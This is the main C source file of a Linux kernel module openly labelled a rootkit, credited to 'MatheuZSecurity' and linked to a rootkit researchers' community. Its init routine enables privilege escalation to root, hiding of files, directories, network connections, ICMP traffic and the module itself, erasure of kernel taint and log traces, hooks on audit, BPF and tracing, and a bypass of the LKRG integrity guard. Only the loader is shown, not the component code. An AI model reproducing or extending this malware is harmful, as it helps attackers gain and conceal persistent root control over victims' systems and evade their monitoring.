#include "include/core.h"
#include "include/reset_tainted.h"
#include "include/become_root.h"
#include "include/hiding_directory.h"
#include "include/hiding_stat.h"
#include "include/hiding_tcp.h"
#include "include/hooks_write.h"
#include "include/clear_taint_dmesg.h"
#include "include/hiding_chdir.h"
#include "include/hiding_readlink.h"
#include "include/hide_module.h"
#include "include/open.h"
#include "include/bpf_hook.h"
#include "include/icmp.h"
#include "include/trace.h"
#include "include/audit.h"
#include "include/task.h"
#include "include/lkrg_bypass.h"
#include "include/sysrq_hook.h"

static int __init singularity_init(void) {
    int ret = 0;
    ret |= reset_tainted_init();
    ret |= hiding_open_init();
    ret |= lkrg_bypass_init();
    ret |= become_root_init();
    ret |= hiding_directory_init();
    ret |= hiding_stat_init();
    ret |= hiding_tcp_init();
    ret |= clear_taint_dmesg_init();
    ret |= hooks_write_init();
    ret |= hiding_chdir_init();
    ret |= hiding_readlink_init();
    ret |= bpf_hook_init();
    ret |= hiding_icmp_init();
    ret |= trace_pid_init();
    ret |= hooking_audit_init();
    ret |= taskstats_hook_init();
    ret |= sysrq_hook_init();
    module_hide_current();
    return ret;
}

static void __exit singularity_exit(void) {
    clear_taint_dmesg_exit();
    hiding_tcp_exit();
    hiding_stat_exit();
    hiding_directory_exit();
    become_root_exit();
    reset_tainted_exit();
    hooks_write_exit();
    hiding_chdir_exit();
    hiding_readlink_exit();
    hiding_open_exit();
    bpf_hook_exit();
    hiding_icmp_exit();
    trace_pid_cleanup();
    hooking_audit_exit();
    taskstats_hook_exit();
    lkrg_bypass_exit();
    sysrq_hook_exit();
}

module_init(singularity_init);
module_exit(singularity_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("MatheuZSecurity");
MODULE_DESCRIPTION("Rootkit Researchers: https://discord.gg/66N5ZQppU7");
